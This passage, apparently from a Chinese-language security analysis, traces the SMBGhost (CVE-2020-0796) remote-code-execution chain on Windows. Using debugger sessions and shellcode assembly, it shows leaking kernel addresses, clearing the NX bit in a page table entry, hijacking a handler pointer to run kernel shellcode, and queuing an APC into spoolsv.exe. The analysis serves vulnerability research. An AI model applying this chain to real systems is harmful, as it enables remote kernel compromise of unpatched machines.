ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000

```

后面还是和之前一样，依次从高地址到低地址泄露每一个字节，经过组合最终得到后面还是和之前一样，依次从高地址到低地址泄露每一个字节，经过组合最终得到 AcceptSocket 地址为 0xffffa5083506b848 - 0x50 = 0xffffa508`3506b7f8。

```
kd> db ffffa508`36241250+2d-10
ffffa508`3624126d  00 00 00 00 b0 06 35 08-a5 ff ff b0 ff ff ff 48  ......5........H
ffffa508`3624127d  08 b0 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`3624128d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`3624129d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`362412ad  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`362412bd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`362412cd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`362412dd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................................

kd> u poi(ffffa508`3506b7f8+30)
srvnet!SrvNetWskConnDispatch:
fffff802`57d3d170 50              push    rax
fffff802`57d3d171 5a              pop     rdx
fffff802`57d3d172 d15702          rcl     dword ptr [rdi+2],1
fffff802`57d3d175 f8              clc
fffff802`57d3d176 ff              ???
fffff802`57d3d177 ff00            inc     dword ptr [rax]
fffff802`57d3d179 6e              outs    dx,byte ptr [rsi]
fffff802`57d3d17a d15702          rcl     dword ptr [rdi+2],1

```

采用同样的方法可获取 AcceptSocket 偏移 0x30 处的 srvnet!SrvNetWskConnDispatch 函数的地址。

### 泄露 ntoskrnl 基址

**任意地址读** SrvNetCommonReceiveHandler 函数中存在如下代码，其中 v10 指向 SRVNET_RECV 结构体，以下代码是对 srv2!Srv2ReceiveHandler 函数的调用（HandlerFunctions 表中的第二项），第一个参数来自于 SRVNET_RECV 结构体偏移 0x128 处，第二个参数来自于 SRVNET_RECV 结构体偏移 0x130 处。可通过覆盖 SRVNET_RECV 结构偏移 0x118、0x128、0x130 处的数据，进行已知函数的调用（参数个数不大于 2）。

```
//srvnet!SrvNetCommonReceiveHandler
  v32 = *(_QWORD *)(v10 + 0x118);
  v33 = *(_QWORD *)(v10 + 0x130);
  v34 = *(_QWORD *)(v10 + 0x128);
  *(_DWORD *)(v10 + 0x144) = 3;
  v35 = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD, __int64, __int64, __int64, __int64, __int64))(v32 + 8))( v34, v33, v8, (unsigned int)v11, v9, a5, v7, a7, v55);

```

![](https://images.seebug.org/content/images/2020/09/24/1600927625000-18axzsn.png-w331s)

以下为 RtlCopyUnicodeString 函数部分代码，该函数可通过 srvnet!imp_RtlCopyUnicodeString 索引，并且只需要两个参数（PUNICODE_STRING 结构）。如下所示，PUNICODE_STRING 中包含 Length、MaximumLength（偏移 2）和 Buffer（偏移 8）。RtlCopyUnicodeString 函数会调用 memmove 将 SourceString->Buffer 复制到 DestinationString->Buffer，复制长度为 SourceString->Length 和 DestinationString->MaximumLength 中的最小值。

```
//RtlCopyUnicodeString
void __stdcall RtlCopyUnicodeString(PUNICODE_STRING DestinationString, PCUNICODE_STRING SourceString)
{
  v2 = DestinationString;
  if ( SourceString )
  {
    v3 = SourceString->Length;
    v4 = DestinationString->MaximumLength;
    v5 = SourceString->Buffer;
    if ( (unsigned __int16)v3 <= (unsigned __int16)v4 )
      v4 = v3;
    v6 = DestinationString->Buffer;
    v7 = v4;
    DestinationString->Length = v4;
    memmove(v6, v5, v4);

//PUNICODE_STRING
typedef struct __UNICODE_STRING_
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;

```

可通过覆盖 HandlerFunctions，“替换”srv2!Srv2ReceiveHandler 函数指针为 nt!RtlCopyUnicodeString 函数指针，覆盖 DestinationString 为已知地址的 PUNICODE_STRING 结构地址，SourceString 为待读取地址的 PUNICODE_STRING 结构地址，然后通过向该连接继续发送请求实现任意地址数据读取。

![](https://images.seebug.org/content/images/2020/09/24/1600927629000-19wiqcx.png-w331s)

**ntoskrnl 泄露步骤** 1、首先还是要获取一个 ConnectionBufferList 的地址，本次调试为 0xffffa50834ba42d8。 2、利用任意地址写，将特定数据写入可控的缓冲区（0x2100 缓冲区）的已知偏移处。成功复制后，0xffffa50836241658 处为 0xffffa50836241670，正好指向复制数据的后面，0xffffa50836241668 处为 0xfffff80257d42210（srvnet!imp_IoSizeofWorkItem），指向 nt!IoSizeofWorkItem 函数（此次要泄露 nt!IoSizeofWorkItem 函数地址）。

```
//要复制的数据
kd> dd ffffa508`36240050
ffffa508`36240050  424d53fc ffffffff 00000001 00000020
ffffa508`36240060  00060006 00000000 36241670 ffffa508
ffffa508`36240070  00060006 00000000 57d42210 fffff802

kd> dd ffffa508`2fe38050+1100  //任意地址写，注意0xffffa5082fe39168处数据
ffffa508`2fe39150  35c3e150 ffffa508 34803a18 ffffa508
ffffa508`2fe39160  00000002 00000000 2fe38050 ffffa508
ffffa508`2fe39170  00001100 00000000 00001278 00000400
kd> p
srv2!Srv2DecompressData+0xe1:
fffff802`51ce7f41 85c0            test    eax,eax
kd> dd ffffa508`2fe38050+1100 //要复制的可控地址（0x18处）
ffffa508`2fe39150  00000000 00000000 00000000 00000000
ffffa508`2fe39160  00000000 00000000 36241650 ffffa508
ffffa508`2fe39170  00001100 00000000 00001278 00000400

kd> g
copy: ffffa508`36241650  00000000`00000000 00000000`00000000
srv2!Srv2DecompressData+0x108:
fffff802`51ce7f68 e85376ffff      call    srv2!memcpy (fffff802`51cdf5c0)
kd> dd rcx
ffffa508`36241650  00000000 00000000 00000000 00000000
ffffa508`36241660  00000000 00000000 00000000 00000000
kd> p
srv2!Srv2DecompressData+0x10d:
fffff802`51ce7f6d 8b442460        mov     eax,dword ptr [rsp+60h]
kd> dd ffffa508`36241650  //成功复制
ffffa508`36241650  00060006 00000000 36241670 ffffa508
ffffa508`36241660  00060006 00000000 57d42210 fffff802

//nt!IoSizeofWorkItem函数指针
kd> u poi(fffff80257d42210)
nt!IoSizeofWorkItem:
fffff802`52c7f7a0 b858000000      mov     eax,58h
fffff802`52c7f7a5 c3              ret

```

3、利用任意地址写将 srvnet!imp_RtlCopyUnicodeString 指针 - 8 的地址写入 SRVNET_RECV 结构偏移 0x118 处的 HandlerFunctions，这样系统会认为 nt!RtlCopyUnicodeString 指针是 srv2!Srv2ReceiveHandler 函数指针。

```
kd> dd 0xffffa50834ba42d8-58+118    //HandlerFunctions
ffffa508`34ba4398  3479cd18 ffffa508 2f4a6dc0 ffffa508
ffffa508`34ba43a8  34ae4170 ffffa508 34f2a040 ffffa508

kd> u poi(ffffa5083479cd18+8)    //覆盖前第二项为srv2!Srv2ReceiveHandler函数指针
srv2!Srv2ReceiveHandler:
fffff802`51cdc3b0 44894c2420      mov     dword ptr [rsp+20h],r9d
fffff802`51cdc3b5 53              push    rbx
fffff802`51cdc3b6 55              push    rbp
fffff802`51cdc3b7 4154            push    r12
fffff802`51cdc3b9 4155            push    r13
fffff802`51cdc3bb 4157            push    r15
fffff802`51cdc3bd 4883ec70        sub     rsp,70h
fffff802`51cdc3c1 488b8424d8000000 mov     rax,qword ptr [rsp+0D8h]

kd> g
copy: ffffa508`34ba4398  ffffa508`3479cd18 ffffa508`2f4a6dc0
srv2!Srv2DecompressData+0x108:
fffff802`51ce7f68 e85376ffff      call    srv2!memcpy (fffff802`51cdf5c0)
kd> p
srv2!Srv2DecompressData+0x10d:
fffff802`51ce7f6d 8b442460        mov     eax,dword ptr [rsp+60h]
kd> dq ffffa508`34ba4398
ffffa508`34ba4398  fffff802`57d42280 ffffa508`2f4a6dc0
ffffa508`34ba43a8  ffffa508`34ae4170 ffffa508`34f2a040
kd> u poi(fffff802`57d42280+8)    //覆盖前第二项为nt!RtlCopyUnicodeString函数指针
nt!RtlCopyUnicodeString:
fffff802`52d1c170 4057            push    rdi
fffff802`52d1c172 4883ec20        sub     rsp,20h
fffff802`52d1c176 488bc2          mov     rax,rdx
fffff802`52d1c179 488bf9          mov     rdi,rcx
fffff802`52d1c17c 4885d2          test    rdx,rdx
fffff802`52d1c17f 745b            je      nt!RtlCopyUnicodeString+0x6c (fffff802`52d1c1dc)
fffff802`52d1c181 440fb700        movzx   r8d,word ptr [rax]
fffff802`52d1c185 0fb74102        movzx   eax,word ptr [rcx+2]

```

4、利用任意地址写分别将两个参数写入 SRVNET_RECT 结构的偏移 0x128 和 0x130 处，为 HandlerFunctions 中函数的前两个参数。

```
kd> dd 0xffffa50834ba42d8-58+118
ffffa508`34ba4398  57d42280 fffff802 2f4a6dc0 ffffa508
ffffa508`34ba43a8  36241650 ffffa508 36241660 ffffa508

```

5、向原始连接发送请求，等待 srv2!Srv2ReceiveHandler 函数（nt!RtlCopyUnicodeString 函数）被调用，函数执行后，nt!IoSizeofWorkItem 函数的低 6 个字节成功被复制到目标地址。

```
kd> dq ffffa508`36241670 
ffffa508`36241670  0000f802`52c7f7a0 00000000`00000000
ffffa508`36241680  00000000`00000000 00000000`00000000
ffffa508`36241690  00000000`00000000 00000000`00000000

kd> u fffff802`52c7f7a0
nt!IoSizeofWorkItem:
fffff802`52c7f7a0 b858000000      mov     eax,58h
fffff802`52c7f7a5 c3              ret

```

6、然后利用之前的方式将这 6 个字节依次泄露出来，加上 0xffff000000000000，减去 IoSizeofWorkItem 函数在模块中的偏移得到 ntoskrnl 基址。

### Shellcode 复制 && 执行

1、获取 PTE 基址 利用任意地址读读取 nt!MiGetPteAddress 函数偏移 0x13 处的地址，低 6 位即可。然后加上 0xffff000000000000 得到 PTE 基址为 0xFFFFF10000000000（0xfffff80252d03d39 处第二个操作数）。

```
kd> u nt!MiGetPteAddress
nt!MiGetPteAddress:
fffff802`52d03d28 48c1e909        shr     rcx,9
fffff802`52d03d2c 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
fffff802`52d03d36 4823c8          and     rcx,rax
fffff802`52d03d39 48b80000000000f1ffff mov rax,0FFFFF10000000000h
fffff802`52d03d43 4803c1          add     rax,rcx
fffff802`52d03d46 c3              ret

d> db nt!MiGetPteAddress + 13 l8
fffff802`52d03d3b  00 00 00 00 00 f1 ff ff                          ........

```

2、利用任意地址写将 Shellcode 复制到 0xFFFFF78000000800 处，在后续章节会对 Shellcode 进行进一步分析。

```
kd> u 0xFFFFF78000000800
fffff780`00000800 55              push    rbp
fffff780`00000801 e807000000      call    fffff780`0000080d
fffff780`00000806 e819000000      call    fffff780`00000824
fffff780`0000080b 5d              pop     rbp
fffff780`0000080c c3              ret
fffff780`0000080d 488d2d00100000  lea     rbp,[fffff780`00001814]
fffff780`00000814 48c1ed0c        shr     rbp,0Ch
fffff780`00000818 48c1e50c        shl     rbp,0Ch

```

3、计算 Shellcode 的 PTE，依然采用 nt!MiGetPteAddress 函数中的计算公式。((0xFFFFF78000000800>> 9 ) & 0x7FFFFFFFF8) + 0xFFFFF10000000000 = 0xFFFFF17BC0000000。然后取出 Shellcode PTE 偏移 7 处的字节并和 0x7F 相与之后放回原处，去除 NX 标志位。

```
kd> db fffff17b`c0000000    //去NX标志前
fffff17b`c0000000  63 39 fb 00 00 00 00 80-00 00 00 00 00 00 00 00  c9..............
fffff17b`c0000010  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

kd> dt _MMPTE_HARDWARE fffff17b`c0000000
nt!_MMPTE_HARDWARE
   +0x000 Valid            : 0y1
   +0x000 Dirty1           : 0y1
   +0x000 Owner            : 0y0
   +0x000 WriteThrough     : 0y0
   +0x000 CacheDisable     : 0y0
   +0x000 Accessed         : 0y1
   +0x000 Dirty            : 0y1
   +0x000 LargePage        : 0y0
   +0x000 Global           : 0y1
   +0x000 CopyOnWrite      : 0y0
   +0x000 Unused           : 0y0
   +0x000 Write            : 0y1
   +0x000 PageFrameNumber  : 0y000000000000000000000000111110110011 (0xfb3)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge          : 0y0000
   +0x000 WsleProtection   : 0y000
   +0x000 NoExecute        : 0y1

kd> db fffff17b`c0000000    //去NX标志后
fffff17b`c0000000  63 39 fb 00 00 00 00 00-00 00 00 00 00 00 00 00  c9..............
fffff17b`c0000010  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
kd> dt _MMPTE_HARDWARE fffff17b`c0000000
nt!_MMPTE_HARDWARE
   +0x000 Valid            : 0y1
   +0x000 Dirty1           : 0y1
   +0x000 Owner            : 0y0
   +0x000 WriteThrough     : 0y0
   +0x000 CacheDisable     : 0y0
   +0x000 Accessed         : 0y1
   +0x000 Dirty            : 0y1
   +0x000 LargePage        : 0y0
   +0x000 Global           : 0y1
   +0x000 CopyOnWrite      : 0y0
   +0x000 Unused           : 0y0
   +0x000 Write            : 0y1
   +0x000 PageFrameNumber  : 0y000000000000000000000000111110110011 (0xfb3)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge          : 0y0000
   +0x000 WsleProtection   : 0y000
   +0x000 NoExecute        : 0y0

```

4、利用任意地址写将 Shellcode 地址（0xFFFFF78000000800）放入可控地址，然后采用已知函数调用的方法用指向 Shellcode 指针的可控地址减 8 的值覆写 HandlerFunctions。使得 HandlerFunctions 中的 srv2!Srv2ReceiveHandler 函数指针被覆盖为 Shellcode 地址。然后向该连接发包，等待 Shellcode 被调用。另外，由于 ntoskrnl 基址已经被泄露出来，可以将其作为参数传给 Shellcode，在 Shellcode 中就不需要获取 ntoskrnl 基址了。

```
kd> dq ffffa508`34ba42d8-58+118 l1
ffffa508`34ba4398  ffffa508`36241648

kd> u poi(ffffa508`36241648+8)
fffff780`00000800 55              push    rbp
fffff780`00000801 e807000000      call    fffff780`0000080d
fffff780`00000806 e819000000      call    fffff780`00000824
fffff780`0000080b 5d              pop     rbp
fffff780`0000080c c3              ret
fffff780`0000080d 488d2d00100000  lea     rbp,[fffff780`00001814]
fffff780`00000814 48c1ed0c        shr     rbp,0Ch
fffff780`00000818 48c1e50c        shl     rbp,0Ch

kd> dq ffffa508`34ba42d8-58+128 l1
ffffa508`34ba43a8  fffff802`52c12000

kd> lmm nt
Browse full module list
start             end                 module name
fffff802`52c12000 fffff802`536c9000   nt         (pdb symbols)          C:\ProgramData\Dbg\sym\ntkrnlmp.pdb\5A8A70EAE29939EFA17C9FC879FA0D901\ntkrnlmp.pdb

kd> g
Breakpoint 0 hit
fffff780`00000800 55              push    rbp
kd> r rcx    //ntoskrnl基址
rcx=fffff80252c12000

```

本分析参考以下链接：[https://github.com/ZecOps/CVE-2020-0796-RCE-POC/blob/master/smbghost_kshellcode_x64.asm](https://github.com/ZecOps/CVE-2020-0796-RCE-POC/blob/master/smbghost_kshellcode_x64.asm)

### 寻找 ntoskrnl.exe 基址

获取内核模块基址在漏洞利用中是很关键的事情，在后面会用到它的很多导出函数。这里列出常见的一种获取 ntoskrnl.exe 基址的思路： 通过 KPCR 找到 IdtBase，然后根据 IdtBase 寻找中断 0 的 ISR 入口点，该入口点属于 ntoskrnl.exe 模块，所以可以在找到该地址后向前搜索找到 ntoskrnl.exe 模块基址。 在 64 位系统中，GS 段寄存器在内核态会指向 KPCR，KPCR 偏移 0x38 处为 IdtBase：

```
3: kd> rdmsr 0xC0000101
msr[c0000101] = ffffdc81`fe1c1000

3: kd> dt _kpcr ffffdc81`fe1c1000
nt!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : 0xffffdc81`fe1d6fb0 _KGDTENTRY64
   +0x008 TssBase          : 0xffffdc81`fe1d5000 _KTSS64
   +0x010 UserRsp          : 0x10ff588
   +0x018 Self             : 0xffffdc81`fe1c1000 _KPCR
   +0x020 CurrentPrcb      : 0xffffdc81`fe1c1180 _KPRCB
   +0x028 LockArray        : 0xffffdc81`fe1c1870 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : 0x00000000`00e11000 Void
   +0x038 IdtBase          : 0xffffdc81`fe1d4000 _KIDTENTRY64
   ......
   +0x180 Prcb             : _KPRCB

```

ISR 入口点在_KIDTENTRY64 结构体中被分成三部分：OffsetLow、OffsetMiddle 以及 OffsetHigh。其计算公式为：(OffsetHigh << 32) | ( OffsetMiddle << 16 ) | OffsetLow ，如下所示，本次调试的入口地址实际上是 0xfffff8004f673d00，该地址位于 ntoskrnl.exe 模块。

```
3: kd> dx -id 0,0,ffff818c6286f040 -r1 ((ntkrnlmp!_KIDTENTRY64 *)0xffffdc81fe1d4000)
((ntkrnlmp!_KIDTENTRY64 *)0xffffdc81fe1d4000)                 : 0xffffdc81fe1d4000 [Type: _KIDTENTRY64 *]
    [+0x000] OffsetLow        : 0x3d00 [Type: unsigned short]
    [+0x002] Selector         : 0x10 [Type: unsigned short]
    [+0x004 ( 2: 0)] IstIndex         : 0x0 [Type: unsigned short]
    [+0x004 ( 7: 3)] Reserved0        : 0x0 [Type: unsigned short]
    [+0x004 (12: 8)] Type             : 0xe [Type: unsigned short]
    [+0x004 (14:13)] Dpl              : 0x0 [Type: unsigned short]
    [+0x004 (15:15)] Present          : 0x1 [Type: unsigned short]
    [+0x006] OffsetMiddle     : 0x4f67 [Type: unsigned short]
    [+0x008] OffsetHigh       : 0xfffff800 [Type: unsigned long]
    [+0x00c] Reserved1        : 0x0 [Type: unsigned long]
    [+0x000] Alignment        : 0x4f678e0000103d00 [Type: unsigned __int64]

3: kd> u 0xfffff8004f673d00
nt!KiDivideErrorFault:
fffff800`4f673d00 4883ec08        sub     rsp,8
fffff800`4f673d04 55              push    rbp
fffff800`4f673d05 4881ec58010000  sub     rsp,158h
fffff800`4f673d0c 488dac2480000000 lea     rbp,[rsp+80h]
fffff800`4f673d14 c645ab01        mov     byte ptr [rbp-55h],1
fffff800`4f673d18 488945b0        mov     qword ptr [rbp-50h],rax

```

可直接取 IdtBase 偏移 4 处的 QWORD 值，与 0xfffffffffffff000 相与，然后进行页对齐向前搜索，直到匹配到魔值 "\x4D\x5A"（MZ），此时就得到了 ntoskrnl.exe 基址。有了 ntoskrnl.exe 模块的基址，就可以通过遍历导出表获取相关函数的地址。

```
3: kd> dq 0xffffdc81`fe1d4000+4 l1
ffffdc81`fe1d4004  fffff800`4f678e00

3: kd> lmm nt
Browse full module list
start             end                 module name
fffff800`4f4a7000 fffff800`4ff5e000   nt         (pdb symbols)          C:\ProgramData\Dbg\sym\ntkrnlmp.pdb\5A8A70EAE29939EFA17C9FC879FA0D901\ntkrnlmp.pdb

3: kd> db fffff800`4f4a7000
fffff800`4f4a7000  4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00  MZ..............
fffff800`4f4a7010  b8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......
fffff800`4f4a7020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
fffff800`4f4a7030  00 00 00 00 00 00 00 00-00 00 00 00 08 01 00 00  ................
fffff800`4f4a7040  0e 1f ba 0e 00 b4 09 cd-21 b8 01 4c cd 21 54 68  ........!..L.!Th
fffff800`4f4a7050  69 73 20 70 72 6f 67 72-61 6d 20 63 61 6e 6e 6f  is program canno
fffff800`4f4a7060  74 20 62 65 20 72 75 6e-20 69 6e 20 44 4f 53 20  t be run in DOS 
fffff800`4f4a7070  6d 6f 64 65 2e 0d 0d 0a-24 00 00 00 00 00 00 00  mode....$.......

```

### 获取目标 KTHREAD 结构

在 x64 系统上（调试环境），KPCR 偏移 0x180 处为 KPRCB 结构，KPRCB 结构偏移 8 处为_KTHREAD 结构的 CurrentThread。_KTHREAD 结构偏移 0x220 处为 _KPROCESS 结构。KPROCESS 结构为 EPROCESS 的第一项，EPROCESS 结构偏移 0x488 为_LIST_ENTRY 结构的 ThreadListHead。

```
3: kd> dt nt!_kpcr ffffdc81`fe1c1000
nt!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : 0xffffdc81`fe1d6fb0 _KGDTENTRY64
   +0x008 TssBase          : 0xffffdc81`fe1d5000 _KTSS64
   +0x010 UserRsp          : 0x10ff588
   +0x018 Self             : 0xffffdc81`fe1c1000 _KPCR
   +0x020 CurrentPrcb      : 0xffffdc81`fe1c1180 _KPRCB
   +0x028 LockArray        : 0xffffdc81`fe1c1870 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : 0x00000000`00e11000 Void
   +0x038 IdtBase          : 0xffffdc81`fe1d4000 _KIDTENTRY64
   ......
   +0x180 Prcb             : _KPRCB

3: kd> dx -id 0,0,ffff818c6286f040 -r1 (*((ntkrnlmp!_KPRCB *)0xffffdc81fe1c1180))
(*((ntkrnlmp!_KPRCB *)0xffffdc81fe1c1180))                 [Type: _KPRCB]
    [+0x000] MxCsr            : 0x1f80 [Type: unsigned long]
    [+0x004] LegacyNumber     : 0x3 [Type: unsigned char]
    [+0x005] ReservedMustBeZero : 0x0 [Type: unsigned char]
    [+0x006] InterruptRequest : 0x0 [Type: unsigned char]
    [+0x007] IdleHalt         : 0x1 [Type: unsigned char]
    [+0x008] CurrentThread    : 0xffffdc81fe1d2140 [Type: _KTHREAD *]

3: kd> dx -id 0,0,ffff818c6286f040 -r1 ((ntkrnlmp!_KTHREAD *)0xffffdc81fe1d2140)
((ntkrnlmp!_KTHREAD *)0xffffdc81fe1d2140)                 : 0xffffdc81fe1d2140 [Type: _KTHREAD *]
    [+0x000] Header           [Type: _DISPATCHER_HEADER]
    [+0x018] SListFaultAddress : 0x0 [Type: void *]
    [+0x020] QuantumTarget    : 0x791ddc0 [Type: unsigned __int64]
    [+0x028] InitialStack     : 0xfffff6074c645c90 [Type: void *]
    [+0x030] StackLimit       : 0xfffff6074c640000 [Type: void *]
    [+0x038] StackBase        : 0xfffff6074c646000 [Type: void *]
    ......
    [+0x220] Process          : 0xfffff8004fa359c0 [Type: _KPROCESS *]

3: kd> dt _eprocess 0xfffff8004fa359c0
nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
   +0x2e8 UniqueProcessId  : (null) 
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]
   ......
   +0x450 ImageFileName    : [15]  "Idle"
   ......
   +0x488 ThreadListHead   : _LIST_ENTRY [ 0xfffff800`4fa38ab8 - 0xffffdc81`fe1d27f8 ]

```

*   nt!PsGetProcessImageFileName 通过此函数得到 ImageFileName 在 EPROCESS 中的偏移（0x450），然后通过一些判断和计算获得 ThreadListHead 在 EPROCESS 中的偏移（调试环境为 0x488）。
    
*   nt!IoThreadToProcess 从 KTHREAD 结构中得到 KPROCESS（EPROCESS）结构体的地址（偏移 0x220 处）。然后通过之前计算出的偏移获取 ThreadListHead 结构，通过访问 ThreadListHead 结构获取 ThreadListEntry（位于 ETHREAD），遍历 ThreadListEntry 以计算 KTHREAD（ETHREAD）相对于 ThreadListEntry 的偏移，自适应相关吧。
    

```
kd> u rip
nt!IoThreadToProcess:
fffff805`39a79360 488b8120020000  mov     rax,qword ptr [rcx+220h]
fffff805`39a79367 c3              ret

kd> g
Breakpoint 0 hit
fffff780`0000091d 4d29ce          sub     r14,r9

kd> ub rip
fffff780`00000900 4d89c1          mov     r9,r8
fffff780`00000903 4d8b09          mov     r9,qword ptr [r9]
fffff780`00000906 4d39c8          cmp     r8,r9
fffff780`00000909 0f84e4000000    je      fffff780`000009f3
fffff780`0000090f 4c89c8          mov     rax,r9
fffff780`00000912 4c29f0          sub     rax,r14
fffff780`00000915 483d00070000    cmp     rax,700h
fffff780`0000091b 77e6            ja      fffff780`00000903

kd> dt _ethread @r14 -y ThreadListEntry 
nt!_ETHREAD
   +0x6b8 ThreadListEntry : _LIST_ENTRY [ 0xffffca8d`1382f6f8 - 0xffffca8d`1a0d36f8 ]

kd> dq r9 l1
ffffca8d`1a0d2738  ffffca8d`1382f6f8

kd> ? @r9-@r14
Evaluate expression: 1720 = 00000000`000006b8

```

*   nt!PsGetCurrentProcess 通过 nt!PsGetCurrentProcess 获取当前线程所在进程的指针 （KPROCESS / EPRROCESS 地址），该指针存放在 KTHREAD 偏移 0xB8 处：通过 KTHREAD 偏移 0x98 访问 ApcState；然后通过 ApcState（KAPC_STATE 结构）偏移 0x20 访问 EPROCESS（KPROCESS）。

```
kd> u rax
nt!PsGetCurrentProcess:
fffff800`4f5a9ca0 65488b042588010000 mov   rax,qword ptr gs:[188h]
fffff800`4f5a9ca9 488b80b8000000  mov     rax,qword ptr [rax+0B8h]
fffff800`4f5a9cb0 c3              ret

kd> dt _kthread @rax
nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   ......
   +0x098 ApcState         : _KAPC_STATE

kd> dx -id 0,0,ffffca8d10ea3340 -r1 (*((ntkrnlmp!_KAPC_STATE *)0xffffca8d1a0d2118))
(*((ntkrnlmp!_KAPC_STATE *)0xffffca8d1a0d2118))                 [Type: _KAPC_STATE]
    [+0x000] ApcListHead      [Type: _LIST_ENTRY [2]]
    [+0x020] Process          : 0xffffca8d10ea3340 [Type: _KPROCESS *]
    [+0x028] InProgressFlags  : 0x0 [Type: unsigned char]

```

*   nt!PsGetProcessId 通过 nt!PsGetProcessId 函数得到 UniqueProcessId 在 EPROCESS 结构中的偏移（0x2e8），然后通过加 8 定位到 ActiveProcessLinks。通过遍历 ActiveProcessLinks 来访问不同进程的 EPROCESS 结构，通过比较 EPROCESS 中 ImageFileName 的散列值来寻找目标进程（"spoolsv.exe"）。

```
kd> g
Breakpoint 1 hit
fffff780`0000096e bf48b818b8      mov     edi,0B818B848h

kd> dt _EPROCESS @rcx
nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
   +0x2e8 UniqueProcessId  : 0x00000000`0000074c Void
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffffca8d`179455f0 - 0xffffca8d`13fa15f0 ]
   ......
   +0x450 ImageFileName    : [15]  "spoolsv.exe"

```

*   nt!PsGetProcessPeb && nt!PsGetThreadTeb 然后通过调用 nt!PsGetProcessPeb，获取 "spoolsv.exe" 的 PEB 结构（偏移 0x3f8 处）并保存起来，然后通过 ThreadListHead 遍历 ThreadListEntry，以寻找一个 Queue 不为 0 的 KTHREAD（可通过 nt!PsGetThreadTeb 函数获取 TEB 结构在 KTHREAD 结构中的偏移，然后减 8 得到 Queue）。

```
kd> dt _EPROCESS @rcx
nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
   +0x2e8 UniqueProcessId  : 0x00000000`0000074c Void
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffffca8d`179455f0 - 0xffffca8d`13fa15f0 ]
   ......
   +0x3f8 Peb              : 0x00000000`00360000 _PEB
   ......
   +0x488 ThreadListHead   : _LIST_ENTRY [ 0xffffca8d`18313738 - 0xffffca8d`178e9738 ]

kd> dt _kTHREAD @rdx
nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x3b5dc10
   +0x028 InitialStack     : 0xfffffe80`76556c90 Void
   +0x030 StackLimit       : 0xfffffe80`76551000 Void
   +0x038 StackBase        : 0xfffffe80`76557000 Void
   ......
   +0x0e8 Queue            : 0xffffca8d`1307d180 _DISPATCHER_HEADER
   +0x0f0 Teb              : 0x00000000`00387000 Void

kd> r rdx    //目标KTHREAD
rdx=ffffca8d178e9080

kd> dt _ETHREAD @rdx   //感觉这个没啥用，先留着
nt!_ETHREAD
   +0x000 Tcb              : _KTHREAD
   ......
   +0x6b8 ThreadListEntry  : _LIST_ENTRY [ 0xffffca8d`18cbe6c8 - 0xffffca8d`16d2e738 ]

```

### 向目标线程插入 APC 对象

*   nt!KeInitializeApc 通过调用 nt!KeInitializeApc 函数来初始化 APC 对象（KAPC 类型)。如下所示，第一个参数指明了待初始化的 APC 对象，第二个参数关联上面的 kTHREAD 结构，第四个参数为 KernelApcRoutine 函数指针，第七个参数指明了 UserMode：

```
    ; KeInitializeApc(PKAPC,    //0xfffff78000000e30
    ;                 PKTHREAD,     //0xffffca8d178e9080
    ;                 KAPC_ENVIRONMENT = OriginalApcEnvironment (0),
    ;                 PKKERNEL_ROUTINE = kernel_apc_routine,  //0xfffff78000000a62
    ;                 PKRUNDOWN_ROUTINE = NULL,
    ;                 PKNORMAL_ROUTINE = userland_shellcode,  ;fffff780`00000e00
    ;                 KPROCESSOR_MODE = UserMode (1),
    ;                 PVOID Context);   ;fffff780`00000e00
    lea rcx, [rbp+DATA_KAPC_OFFSET]     ; PAKC
    xor r8, r8      ; OriginalApcEnvironment
    lea r9, [rel kernel_kapc_routine]    ; KernelApcRoutine
    push rbp    ; context
    push 1      ; UserMode
    push rbp    ; userland shellcode (MUST NOT be NULL) 
    push r8     ; NULL
    sub rsp, 0x20   ; shadow stack
    mov edi, KEINITIALIZEAPC_HASH
    call win_api_direct

//初始化后的KAPC结构
kd> dt _kapc fffff78000000e30
nt!_KAPC
   +0x000 Type             : 0x12 ''
   +0x001 SpareByte0       : 0 ''
   +0x002 Size             : 0x58 'X'
   +0x003 SpareByte1       : 0 ''
   +0x004 SpareLong0       : 0
   +0x008 Thread           : 0xffffca8d`178e9080 _KTHREAD
   +0x010 ApcListEntry     : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]
   +0x020 KernelRoutine    : 0xfffff780`00000a62     void  +fffff78000000a62
